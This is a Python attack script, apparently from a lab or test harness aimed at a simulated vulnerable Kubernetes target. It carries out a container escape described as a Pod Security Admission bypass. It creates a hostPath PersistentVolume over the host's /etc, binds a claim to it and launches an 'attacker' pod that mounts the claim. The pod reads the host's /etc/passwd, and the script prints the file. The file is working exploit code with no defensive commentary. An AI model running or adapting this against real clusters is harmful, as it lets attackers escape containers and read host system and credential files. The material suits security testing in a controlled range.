import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Creating HostPath-backed PersistentVolume (PSA Bypass)")
    pv_spec = {
        "apiVersion": "v1",
        "kind": "PersistentVolume",
        "metadata": {"name": "bypass-pv"},
        "spec": {
            "capacity": {"storage": "1Gi"},
            "accessModes": ["ReadWriteOnce"],
            "hostPath": {"path": "/etc"}
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/persistentvolumes", json=pv_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] PersistentVolume created successfully!")
            print(f"[+] PV metadata: {resp.json()}")
        else:
            print(f"[-] PV creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] PV request failed: {e}")
        return

    print("[*] Phase 2: Creating PersistentVolumeClaim to mount host storage")
    pvc_spec = {
        "apiVersion": "v1",
        "kind": "PersistentVolumeClaim",
        "metadata": {"name": "bypass-pvc"},
        "spec": {
            "accessModes": ["ReadWriteOnce"],
            "resources": {"requests": {"storage": "1Gi"}},
            "volumeName": "bypass-pv"
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/persistentvolumeclaims", json=pvc_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] PersistentVolumeClaim created and bound!")
            print(f"[+] PVC metadata: {resp.json()}")
        else:
            print(f"[-] PVC creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] PVC request failed: {e}")
        return

    print("[*] Phase 3: Creating pod that mounts PVC and reading host /etc/passwd")
    pod_spec = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "bypass-pod"},
        "spec": {
            "containers": [{"name": "attacker", "image": "alpine", "command": ["cat", "/mnt/host/passwd"]}],
            "volumes": [{"name": "host-vol", "persistentVolumeClaim": {"claimName": "bypass-pvc"}}]
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/pods", json=pod_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] Pod scheduled with PVC mount!")
        else:
            print(f"[-] Pod creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Pod creation request failed: {e}")
        return

    try:
        resp = requests.post(f"{url}/pod-exec", json={"pod": "bypass-pod", "cmd": "cat /mnt/host/passwd"}, timeout=10)
        if resp.status_code == 200:
            result = resp.json()
            print("[+] Host escape via PVC successful! Contents of host /etc/passwd:")
            print(result.get("output", ""))
        else:
            print(f"[-] Pod exec failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Pod exec request failed: {e}")
